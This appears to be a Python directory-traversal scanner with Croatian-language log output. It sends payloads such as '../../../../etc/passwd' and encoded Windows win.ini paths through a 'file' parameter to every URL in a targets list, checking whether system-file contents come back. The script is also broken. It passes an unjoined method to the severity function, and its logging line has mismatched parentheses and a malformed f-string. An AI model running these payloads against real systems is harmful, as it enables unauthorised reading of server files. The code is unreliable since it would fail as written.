import requests
from utils.log_utils import log_to_sheet, classify_severity

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..\\..\\..\\..\\windows\\win.ini",
    "..%5C..%5C..%5C..%5Cwindows%5Cwin.ini"
]

def load_targets(file_path="targets/targets.txt"):
    with open(file_path, "r") as f:
        return [line.strip() for line in f if line.strip()]

def test_traversal(base_url):
    findings = []
    for payload in TRAVERSAL_PAYLOADS:
        test_url = f"{base_url}?file={payload}"
        print(f"[+] Testiram: {test_url}")
        try:
            r = requests.get(test_url, timeout=5)
            if "root:x" in r.text or "[extensions]" in r.text:
                findings.append(test_url)
                print(f"[!] Mogući Directory Traversal: {test_url}")
        except Exception as e:
            print(f"[-] Greška: {e}")
    return findings

def run_traversal_scan():
    print("[~] Pokrećem Directory Traversal test...")
    targets = load_targets()
    for url in targets:
        found = test_traversal(url)
        if found:
            severity = classify_severity("\n".join)
            log_to_sheet(__file__, "\n".join(found)) + f' | Severity: {{severity}}')

if __name__ == "__main__":
    run_traversal_scan()
